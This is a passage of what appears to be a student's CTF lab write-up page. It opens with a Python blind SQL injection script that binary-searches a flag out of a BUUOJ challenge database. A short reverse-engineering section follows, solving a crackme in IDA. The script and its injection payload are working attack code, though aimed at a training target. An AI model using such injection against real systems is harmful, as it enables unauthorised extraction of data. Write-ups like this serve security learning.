<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-15-10">10</a></span>
<span class="normal"><a href="#__codelineno-15-11">11</a></span>
<span class="normal"><a href="#__codelineno-15-12">12</a></span>
<span class="normal"><a href="#__codelineno-15-13">13</a></span>
<span class="normal"><a href="#__codelineno-15-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">post</span>
<a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="n">result</span> <span class="o">=</span> <span class="s2">""</span>
<a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
<a id="__codelineno-15-4" name="__codelineno-15-4"></a>    <span class="n">low</span><span class="p">,</span> <span class="n">high</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">127</span>
<a id="__codelineno-15-5" name="__codelineno-15-5"></a>    <span class="k">while</span> <span class="n">low</span> <span class="o">&lt;</span> <span class="n">high</span><span class="p">:</span>
<a id="__codelineno-15-6" name="__codelineno-15-6"></a>        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
<a id="__codelineno-15-7" name="__codelineno-15-7"></a>        <span class="n">response</span> <span class="o">=</span> <span class="n">post</span><span class="p">(</span><span class="s1">'http://2c0616c9-8209-4027-aa6a-724ee8f9d39e.node5.buuoj.cn:81/index.php'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"id"</span><span class="p">:</span> <span class="sa">f</span><span class="s2">"if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,2)"</span><span class="p">})</span><span class="o">.</span><span class="n">text</span>
<a id="__codelineno-15-8" name="__codelineno-15-8"></a>        <span class="k">if</span> <span class="s1">'glzjin'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
<a id="__codelineno-15-9" name="__codelineno-15-9"></a>            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
<a id="__codelineno-15-10" name="__codelineno-15-10"></a>        <span class="k">else</span><span class="p">:</span>
<a id="__codelineno-15-11" name="__codelineno-15-11"></a>            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
<a id="__codelineno-15-12" name="__codelineno-15-12"></a>    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">low</span><span class="p">)</span>
<a id="__codelineno-15-13" name="__codelineno-15-13"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<a id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<div style="page-break-after: always;"></div>
<h2 id="reverse">Reverse<a class="headerlink" href="#reverse" title="Permanent link">¶</a></h2>
<p>这个<span class="heti-skip"><span class="heti-spacing"> </span>rev<span class="heti-spacing"> </span></span>好简单，要是今年校赛题都是这样的就更好了（x）</p>
<p><img alt="alt text" src="../reverseyitizuobuchulai.png"/></p>
<p>下载<span class="heti-skip"><span class="heti-spacing"> </span>crackme<span class="heti-spacing"> </span></span>并丢到<span class="heti-skip"><span class="heti-spacing"> </span>IDA<span class="heti-spacing"> </span></span>中可以找到如下内容：</p>
<p><img alt="alt text" src="../1726afb752ded5231e1c369bafb25f80.png"/></p>
<p>顺藤摸<span><span class="heti-spacing"> </span>到</span><span class="heti-skip"><span class="heti-spacing"> </span>verify<span class="heti-spacing"> </span></span><span><span class="heti-spacing"> </span>和tab</span>le：</p>
<p><img alt="alt text" src="../06206ec8ee738a2e981dcfb9071eedf8.png"/></p>
<p>很容易发现是对<span class="heti-skip"><span class="heti-spacing"> </span>buffer<span class="heti-spacing"> </span></span>按位乘<span class="heti-skip"><span class="heti-spacing"> </span>16<span class="heti-spacing"> </span></span>再和<span class="heti-skip"><span class="heti-spacing"> </span>table<span class="heti-spacing"> </span></span>比较。所以只需要把<span class="heti-skip"><span class="heti-spacing"> </span>table<span class="heti-spacing"> </span></span>全除<span class="heti-skip"><span class="heti-spacing"> </span>16<span class="heti-spacing"> </span></span>就可以得到结果：</p>
<p><img alt="alt text" src="../image-1.png"/></p>
<p>于是<span><span class="heti-spacing"> </span>得到fl</span>ag：<code>AAA{HiReversq}</code></p>
<p></p><center>
<p>&gt;&gt;3240102120&lt;&lt;</p>
<p></p></center>
</article>
</div>
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
</div>
<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
</main>
<footer class="md-footer">
<nav aria-label="Footer" class="md-footer__inner md-grid">
<a aria-label="Previous: test" class="md-footer__link md-footer__link--prev" href="../../others/test/">
<div class="md-footer__button md-icon">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
</div>
<div class="md-footer__title">
<span class="md-footer__direction">
                Previous
              </span>
<div class="md-ellipsis">
                test
              </div>
</div>
</a>
<a aria-label="Next: misc_lab1" class="md-footer__link md-footer__link--next" href="../misc_lab1/">
<div class="md-footer__title">
<span class="md-footer__direction">
                Next
              </span>
<div class="md-ellipsis">
                misc_lab1
              </div>
</div>
<div class="md-footer__button md-icon">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"></path></svg>
</div>
</a>
</nav>
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-copyright">
<div class="md-copyright__highlight">
      Copyright 2025 AlabTNT
    </div>
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
      Material for MkDocs
    </a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<div class="md-progress" data-md-component="progress" role="progressbar"></div>
<script id="__config" type="application/json">{"base": "../..", "features": ["content.action.edit", "navigation.tracking", "navigation.expand", "navigation.top", "navigation.footer", "navigation.tabs", "navigation.instant", "navigation.instant.progress"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
<script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
<script src="../../javascripts/katex.js"></script>
<script src="../../javascripts/katex2.js"></script>
<script src="https://cdn.jsdelivr.net/gh/jayi0908/jayi0908-trigonometry@master/docs/javascripts/music.js"></script>
<script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"></script>
<script src="../../javascripts/rb.js"></script>
</body>
</html>